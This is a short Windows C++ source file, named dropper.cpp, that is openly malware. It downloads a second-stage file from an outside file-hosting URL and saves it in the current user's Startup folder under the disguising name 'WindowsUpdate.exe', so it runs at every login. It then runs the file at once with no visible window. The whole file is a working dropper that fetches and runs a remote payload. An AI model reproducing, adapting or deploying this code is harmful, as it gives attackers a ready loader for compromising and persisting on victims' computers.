// dropper.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <urlmon.h>
#include <shlobj_core.h>
#pragma comment (lib, "urlmon.lib")
#pragma comment (lib, "shell32.lib")
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
//int main()
{   /*
    Resolve the path of shell:startup of current user
    Download 2nd stage from a url and drop into shell::startup
    Run the 2nd stage
    */

    const wchar_t* szURL = L"https://files.catbox.moe/mcju6j.txt";
    wchar_t* ppszPath;

    // Get the current user shell:starup folder
    HRESULT getStartUpResult = SHGetKnownFolderPath(
        FOLDERID_Startup,
        0,
        0,
        &ppszPath
    );

    //Get the fullPath = ppszPath + "\\<FileName>"
    wchar_t fullPath[MAX_PATH];
    wcscpy_s(fullPath, ppszPath);
    wcscat_s(fullPath, L"\\WindowsUpdate.exe");
    HRESULT downloadResult = URLDownloadToFileW(
        0,
        szURL,
        fullPath,
        0,
        0
    );

    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    BOOL createProcessResult = CreateProcessW(
        fullPath,
        0,
        0,
        0,
        FALSE,
        CREATE_NO_WINDOW,
        0,
        0,
        &info,
        &processInfo
    );

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

}
